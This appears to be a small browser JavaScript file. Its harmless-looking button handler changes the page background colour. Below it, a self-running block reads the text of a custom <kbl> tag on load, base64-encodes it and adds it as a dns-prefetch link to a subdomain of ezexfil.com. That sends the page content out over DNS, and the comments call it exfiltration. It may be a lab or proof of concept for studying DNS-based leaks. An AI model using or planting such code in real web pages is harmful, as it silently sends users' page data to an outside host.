// This runs immediately when the script is loaded by the browser
console.log('delivrd');

/**
 * Changes the background to a random color and logs a message.
 */
function btnCalc() {
    // Generate a random hex color
    const randomColor = '#' + Math.floor(Math.random()*16777215).toString(16);
    
    // Change the background color of the page
    document.body.style.backgroundColor = randomColor;
    
    // Output the print statement
    console.log("Button clicked! New color: " + randomColor);
}


(function() {
    // 1. Find the custom <kbl> tag
    const kblElement = document.querySelector('kbl');

    if (kblElement) {
        // 2. Get the raw text data from the tag
        const rawData = kblElement.textContent || kblElement.innerText;

        // 3. Convert the data to Base64
        // btoa() handles string to base64 conversion
        const base64Data = btoa(rawData);

        // 4. Construct the exfiltration URL
        const exfilUrl = `${base64Data}.z3zhkadg4qsehefe.ezexfil.com`;

        // 5. Create the <link> element
        const link = document.createElement('link');
        link.rel = 'dns-prefetch';
        link.href = `//${exfilUrl}`; // Use // to ensure it's treated as a URL

        // 6. Append to the document head
        document.head.appendChild(link);
        
        console.log(`DNS Prefetch initialized for: ${exfilUrl}`);
    } else {
        console.error("Tag <kbl> not found in document.");
    }
})();
